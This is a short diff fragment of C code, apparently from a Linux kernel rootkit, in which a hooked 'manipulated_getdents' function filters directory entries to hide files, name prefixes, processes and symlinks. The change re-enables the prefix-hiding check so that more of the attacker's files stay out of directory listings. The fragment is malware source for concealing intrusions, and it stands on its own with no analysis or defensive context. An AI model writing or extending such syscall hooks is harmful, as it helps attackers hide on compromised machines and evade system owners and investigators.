@@ -219,7 +219,7 @@ manipulated_getdents (unsigned int fd, struct linux_dirent __user *dirp, unsigne
 		memset(path+path_len + strlen(dirp->d_name) + 1, '\0', 1);
 
 		if(check_hide_fpath(path)
-		//		|| check_hide_fprefix(path)
+				|| check_hide_fprefix(path)
 				|| check_hide_process(fd, dirp->d_name)
 				|| check_hide_symlink(path))
 		{	
